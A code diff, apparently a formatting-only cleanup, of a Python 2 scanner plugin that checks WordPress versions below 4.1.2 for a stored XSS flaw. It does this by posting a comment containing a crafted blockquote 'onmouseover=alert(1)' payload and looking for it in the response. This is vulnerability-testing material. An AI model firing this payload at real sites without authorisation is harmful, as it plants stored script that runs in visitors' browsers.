@@ -7,6 +7,7 @@ import random
 import string
 import requests
 
+
 class Vuln(ABVuln):
     vuln_id = 'WordPress_0007'  # 平台漏洞编号，留空
     name = 'WordPress 存储型XSS'  # 漏洞名称
@@ -25,6 +26,7 @@ class Vuln(ABVuln):
     product = 'WordPress'  # 漏洞应用名称
     product_version = '<4.1.2'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '4c5a9c87-e387-48f8-8573-a4226f35897d'
     author = 'cscan'  # POC编写者
@@ -38,8 +40,10 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            verify_url =  self.target + "/wp-comments-post.php"
-            rand_str = lambda length: ''.join(random.sample(string.letters, length))
+            verify_url = self.target + "/wp-comments-post.php"
+
+            def rand_str(length): return ''.join(
+                random.sample(string.letters, length))
 
             post_id = ''
             try:
@@ -49,7 +53,7 @@ class Poc(ABPoc):
                     post_id = post_id.group('post_id')
             except Exception, e:
                 self.output.info('执行异常{}'.format(e))
-                    
+
             ttys = "test<blockquote cite='%s onmouseover=alert(1)// \xD8\x34\xDF\x06'>"
             flag = rand_str(10)
             payload = {
@@ -62,14 +66,15 @@ class Poc(ABPoc):
             }
             content = requests.post(verify_url, data=payload).content
             if '<blockquote cite=&#8217;%s onmouseover=alert(1)' % flag in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
